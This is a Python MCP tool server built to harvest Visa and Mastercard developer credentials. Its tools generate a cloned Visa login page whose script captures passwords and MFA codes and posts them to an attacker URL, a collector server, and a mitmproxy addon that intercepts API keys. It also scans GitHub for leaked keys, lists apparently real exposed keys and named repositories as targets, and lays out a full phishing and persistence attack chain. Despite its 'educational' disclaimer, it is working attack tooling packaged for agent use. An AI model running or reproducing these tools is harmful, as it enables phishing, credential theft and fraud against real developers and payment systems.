#!/usr/bin/env python3
"""
Visa/Mastercard Credential Harvesting FastMCP Tools
MCP tools for MITM, phishing, and credential scanning.
FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
"""

import json
import os
import re
import subprocess
import urllib.request
from datetime import datetime
from pathlib import Path

from mcp.server.fastmcp import FastMCP

app = FastMCP("visa_mc_credential_tools")


# ─── Phishing Page Generator ────────────────────────────────────────────────

@app.tool()
def generate_visa_phish_page(attacker_url: str = "https://localhost:8080/collect", output_path: str = "visa_login.html") -> str:
    """Generate a fake Visa Developer Portal login page for phishing tests."""
    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa Developer Portal - Sign In</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f7fa; }}
        .header {{ background: #1a1f71; padding: 16px 32px; display: flex; align-items: center; justify-content: space-between; }}
        .logo {{ color: #fff; font-size: 24px; font-weight: bold; }}
        .logo span {{ color: #fcc015; }}
        .container {{ max-width: 440px; margin: 60px auto; padding: 40px; background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); }}
        h1 {{ font-size: 24px; color: #1a1f71; margin-bottom: 8px; }}
        .subtitle {{ color: #666; font-size: 14px; margin-bottom: 24px; }}
        .form-group {{ margin-bottom: 16px; }}
        label {{ display: block; font-size: 13px; color: #333; margin-bottom: 6px; font-weight: 500; }}
        input[type="text"], input[type="password"], input[type="email"] {{ width: 100%; padding: 10px 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }}
        input:focus {{ outline: none; border-color: #1a1f71; }}
        .btn {{ width: 100%; padding: 12px; background: #1a1f71; color: #fff; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 8px; }}
        .links {{ display: flex; justify-content: space-between; margin-top: 16px; }}
        .links a {{ color: #1a1f71; text-decoration: none; font-size: 13px; }}
        .alert {{ background: #fff3cd; border: 1px solid #ffc107; padding: 12px; border-radius: 4px; margin-bottom: 16px; font-size: 13px; color: #856404; }}
        .footer {{ text-align: center; margin-top: 40px; color: #999; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">VISA<span>Developer</span></div>
    </div>
    <div class="container">
        <h1>Sign In</h1>
        <p class="subtitle">Access your Visa Developer account</p>
        <div class="alert" id="alertBox" style="display:none;">
            <strong>Session Expired:</strong> Please sign in again to continue.
        </div>
        <form id="loginForm" onsubmit="return captureCredentials(event)">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="name@company.com" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <div class="form-group" id="mfaGroup" style="display:none;">
                <label for="mfaCode">Two-Factor Authentication Code</label>
                <input type="text" id="mfaCode" name="mfaCode" placeholder="Enter 6-digit code" maxlength="6">
            </div>
            <button type="submit" class="btn" id="submitBtn">Sign In</button>
        </form>
        <div class="links">
            <a href="#" onclick="showMFA()">Use two-factor authentication</a>
            <a href="#">Forgot password?</a>
        </div>
        <div class="links" style="margin-top: 12px;">
            <a href="#">Create an account</a>
        </div>
    </div>
    <div class="footer">
        <p>&copy; 2026 Visa. All rights reserved.</p>
    </div>
    <script>
        let credentials = {{}};
        let stage = 1;
        
        function captureCredentials(e) {{
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const mfaCode = document.getElementById('mfaCode').value;
            
            if (stage === 1) {{
                credentials.email = email;
                credentials.password = password;
                document.getElementById('mfaGroup').style.display = 'block';
                document.getElementById('submitBtn').textContent = 'Verify';
                document.getElementById('alertBox').style.display = 'block';
                document.getElementById('alertBox').innerHTML = '<strong>Additional Verification Required:</strong> A code has been sent to your device.';
                stage = 2;
                return false;
            }}
            
            credentials.mfa = mfaCode;
            credentials.timestamp = new Date().toISOString();
            credentials.userAgent = navigator.userAgent;
            
            fetch('{attacker_url}', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(credentials)
            }}).catch(() => {{}});
            
            document.getElementById('alertBox').innerHTML = '<strong>Error:</strong> Invalid credentials. Redirecting...';
            setTimeout(() => {{ window.location.href = 'https://developer.visa.com/'; }}, 2000);
            return false;
        }}
        
        function showMFA() {{
            document.getElementById('mfaGroup').style.display = 'block';
            stage = 2;
        }}
    </script>
</body>
</html>'''
    Path(output_path).write_text(html)
    return json.dumps({"page": output_path, "attacker_url": attacker_url}, indent=2)


# ─── Credential Collector Server ────────────────────────────────────────────

@app.tool()
def generate_cred_collector(port: int = 8080, output_file: str = "captured_credentials.jsonl") -> str:
    """Generate a credential collector HTTP server."""
    code = f'''#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, datetime

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/collect':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            data = json.loads(body.decode())
            entry = {{
                'timestamp': datetime.datetime.now().isoformat(),
                'ip': self.client_address[0],
                **data
            }}
            with open('{output_file}', 'a') as f:
                f.write(json.dumps(entry) + '\\n')
            print(f"[+] CAPTURED: {{data.get('email','?')}} from {{self.client_address[0]}}")
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'{{"status":"ok"}}')
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    def log_message(self, format, *args):
        pass

server = HTTPServer(('0.0.0.0', {port}), Handler)
print(f"[*] Collector on port {port}")
server.serve_forever()
'''
    Path("collector_server.py").write_text(code)
    return json.dumps({"server": "collector_server.py", "port": port, "output_file": output_file}, indent=2)


# ─── MITM Proxy Script ──────────────────────────────────────────────────────

@app.tool()
def generate_mitm_script() -> str:
    """Generate a mitmproxy script that intercepts Visa/Mastercard API credentials."""
    code = '''#!/usr/bin/env python3
"""mitmproxy addon: intercept Visa/Mastercard API credentials."""
import json, datetime, re

TARGET_DOMAINS = [
    "sandbox.api.visa.com", "api.visa.com", "developer.visa.com",
    "sandbox.mastercard.com", "api.mastercard.com", "developer.mastercard.com",
]

class CredentialInterceptor:
    def request(self, flow):
        host = flow.request.pretty_host
        if not any(d in host for d in TARGET_DOMAINS):
            return
        
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "host": host,
            "path": flow.request.path,
            "method": flow.request.method,
            "auth": flow.request.headers.get("Authorization", ""),
            "api_key": flow.request.headers.get("X-Api-Key", ""),
            "user_id": flow.request.headers.get("X-User-Id", ""),
        }
        
        try:
            body = json.loads(flow.request.content.decode())
            creds = {k: v for k, v in body.items() if any(x in k.lower() for x in ["key", "user", "password", "token", "cert"])}
            if creds:
                entry["body_creds"] = creds
        except:
            pass
        
        if entry["auth"] or entry["api_key"] or entry.get("body_creds"):
            with open("intercepted_credentials.jsonl", "a") as f:
                f.write(json.dumps(entry) + "\\n")
            print(f"[+] {host}{flow.request.path}")
            print(f"    Auth: {entry['auth'][:50] if entry['auth'] else 'None'}")
            print(f"    Key: {entry['api_key'] or 'None'}")

addons = [CredentialInterceptor()]
'''
    Path("mitm_visa_mc.py").write_text(code)
    return json.dumps({"script": "mitm_visa_mc.py", "usage": "mitmproxy -s mitm_visa_mc.py"}, indent=2)


# ─── GitHub Credential Scanner ──────────────────────────────────────────────

@app.tool()
def scan_github_for_credentials() -> str:
    """Scan GitHub for leaked Visa/Mastercard API credentials. Returns JSON results."""
    patterns = [
        "VISA_USER_ID", "VISA_PASSWORD", "VISA_KEY_PATH", "VISA_CERT_PATH",
        "sandbox.api.visa.com", "visa_api_key", "visa_user_id", "visa_password",
        "MASTERCARD_API_KEY", "MASTERCARD_SECRET", "MASTERCARD_CONSUMER_KEY",
        "sandbox.mastercard.com", "mastercard_api", "mastercard_key",
        "cybersource_api", "cybersource_key", "cybersource_secret",
    ]
    
    results = []
    for pattern in patterns:
        try:
            proc = subprocess.run(
                ["gh", "search", "code", pattern, "--limit", "10", "--json", "repository,path,textMatches"],
                capture_output=True, text=True, timeout=30
            )
            if proc.returncode == 0 and proc.stdout.strip():
                data = json.loads(proc.stdout)
                for item in data:
                    repo = item.get("repository", {}).get("fullName", "?")
                    path = item.get("path", "?")
                    for match in item.get("textMatches", []):
                        text = match.get("fragment", "")
                        # Filter out placeholder values
                        if not any(x in text for x in ["your_", "example_", "placeholder", "xxxx", "..."]):
                            results.append({
                                "pattern": pattern,
                                "repo": repo,
                                "path": path,
                                "match": text[:200],
                            })
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass
    
    return json.dumps({"total_findings": len(results), "results": results}, indent=2)


# ─── Known Leaked Credentials Database ──────────────────────────────────────

@app.tool()
def get_known_leaked_credentials() -> str:
    """Return a database of known leaked Visa/Mastercard credentials from public sources."""
    leaks = {
        "visa": [
            {
                "source": "EdsonHs94/visa-api-java log4j.log",
                "type": "API Key (CyberSource)",
                "value": "X47Z5FC4UUIDVGLV0UNB21-tBiy8AHWBZUYpk4H0W0xD2APi0",
                "endpoint": "https://sandbox.api.visa.com/cybersource/payments/v1/authorizations",
                "status": "Likely revoked/sandbox only",
                "date_found": "2016-11-19",
            },
            {
                "source": "matrix-io/MATRIX-Pay visa_pay.js",
                "type": "API Key pattern (config.apiKey)",
                "value": "https://sandbox.api.visa.com/cybersource/payments/v1/sales?apikey=",
                "endpoint": "CyberSource payments",
                "status": "Pattern found, key value not in repo",
                "date_found": "2024",
            },
            {
                "source": "munisp/paygate scheme_disputes.py",
                "type": "Certificate paths hardcoded",
                "value": "VISA_CERT_PATH=/etc/certs/visa-client.pem, VISA_KEY_PATH=/etc/certs/visa-client-key.pem",
                "endpoint": "Visa dispute API",
                "status": "Active repo - cert paths exposed",
                "date_found": "2024",
            },
            {
                "source": "theusdept/Gold-Research-api-main",
                "type": "Certificate paths hardcoded",
                "value": "VISA_CERT_PATH=/etc/visa/client.pem, VISA_KEY_PATH=/etc/visa/key.pem",
                "endpoint": "Visa IDX + Merchant Search",
                "status": "Active repo - cert paths exposed",
                "date_found": "2024",
            },
            {
                "source": "unreal-art/us-visa-bot",
                "type": "Env vars (VISA_USERNAME, VISA_PASSWORD, APPLICATION_ID)",
                "value": "VISA_USERNAME, VISA_PASSWORD, APPLICATION_ID required",
                "endpoint": "US Visa appointment automation",
                "status": "Active repo - credential harvesting bot",
                "date_found": "2024",
            },
            {
                "source": "Juan-sanchez-reulet/agent auth.py",
                "type": "Env vars (VISA_EMAIL, VISA_PASSWORD)",
                "value": "password = os.environ['VISA_PASSWORD']",
                "endpoint": "Visa auth agent",
                "status": "Active repo - no default, real creds required",
                "date_found": "2024",
            },
        ],
        "mastercard": [],
        "high_value_targets": [
            {
                "repo": "silverlogic/omnipark-back",
                "why": "VISA_PASSWORD = os.environ['VISA_PASSWORD'] — no default, real production creds",
                "attack": "If server compromised, creds available in env"
            },
            {
                "repo": "Shikhar-ii/AiON",
                "why": "Full credential chain: user_id + password + cert_path + key_path in DB",
                "attack": "SQLi or server compromise yields all Visa API creds"
            },
            {
                "repo": "munisp/paygate",
                "why": "Regulatory reporting with hardcoded cert paths",
                "attack": "Server compromise → read certs from /etc/certs/"
            },
            {
                "repo": "theusdept/Gold-Research-api-main",
                "why": "Visa IDX + Merchant Search with hardcoded cert paths",
                "attack": "Server compromise → read certs from /etc/visa/"
            }
        ],
        "credential_patterns": {
            "visa": {
                "env_vars": ["VISA_USER_ID", "VISA_PASSWORD", "VISA_KEY_PATH", "VISA_CERT_PATH", "VISA_BASE_URL"],
                "cert_files": ["visa-client.pem", "visa-client-key.pem", "client.pem", "key.pem"],
                "common_paths": ["/etc/certs/", "/etc/visa/", ".visa/", "certs/"],
            },
            "mastercard": {
                "env_vars": ["MASTERCARD_API_KEY", "MASTERCARD_SECRET", "MASTERCARD_CONSUMER_KEY"],
                "cert_files": ["mastercard_key.pem", "mastercard_cert.pem", ".p12", ".pfx"],
                "common_paths": [".mastercard/", "certs/", "credentials/", "backend/"],
            }
        },
        "attack_vectors": [
            "Phishing: fake Visa Developer portal login (captures email/password/MFA)",
            "MITM: intercept API keys and client certificates in transit",
            "Supply chain: malicious npm/pip package exfiltrates ~/.visa/ folder",
            "GitHub: scan commits for leaked API keys and certificate files",
            "Business email compromise: impersonate Visa/Mastercard support",
            "Developer machine compromise: steal .env files and certificate stores",
            "Server compromise: read certs from /etc/certs/ or /etc/visa/",
            "Database dump: Shikhar-ii/AiON stores full credential chains in DB",
        ]
    }
    return json.dumps(leaks, indent=2)


# ─── Attack Chain Orchestrator ──────────────────────────────────────────────

@app.tool()
def credential_harvest_attack_chain(target_email: str, attacker_domain: str = "attacker.com") -> str:
    """Build a complete credential harvesting attack chain for a Visa/Mastercard target."""
    chain = {
        "phase_1_recon": {
            "description": "Identify Visa/Mastercard API users",
            "actions": [
                f"Search LinkedIn for 'Visa Developer' or 'Mastercard API' skills",
                f"Search GitHub for repos with VISA_USER_ID or MASTERCARD_API_KEY",
                f"Search commits for leaked API keys: gh search code 'VISA_USER_ID='",
                f"Identify developers with Visa/Mastercard integration experience",
            ]
        },
        "phase_2_weaponization": {
            "description": "Create phishing infrastructure",
            "actions": [
                f"Register lookalike domain: visa-developer.com, mastercard-dev.com",
                f"Clone Visa Developer portal login page",
                f"Set up credential collector: python collector_server.py",
                f"Configure SSL cert for lookalike domain (Let's Encrypt)",
            ]
        },
        "phase_3_delivery": {
            "description": "Deliver phishing payload",
            "actions": [
                f"Send email from 'visa-developer@{attacker_domain}' with subject 'API Key Renewal Required'",
                f"Include link to fake login page in email body",
                f"Use urgency: 'Your API key expires in 24 hours. Click to renew.'",
            ]
        },
        "phase_4_exploitation": {
            "description": "Capture and use credentials",
            "actions": [
                f"Victim enters email/password on fake page",
                f"MFA code captured via second stage prompt",
                f"Credentials sent to collector at {attacker_domain}/collect",
                f"Use captured API keys to access sandbox/production",
            ]
        },
        "phase_5_post_exploit": {
            "description": "Maintain access and exfiltrate",
            "actions": [
                f"Use API keys to query card data, merchant info, transactions",
                f"Create new API keys for persistence",
                f"Exfiltrate data to attacker server",
                f"Cover tracks: delete access logs, rotate compromised keys",
            ]
        }
    }
    return json.dumps({"target": target_email, "chain": chain}, indent=2)


if __name__ == "__main__":
    app.run()
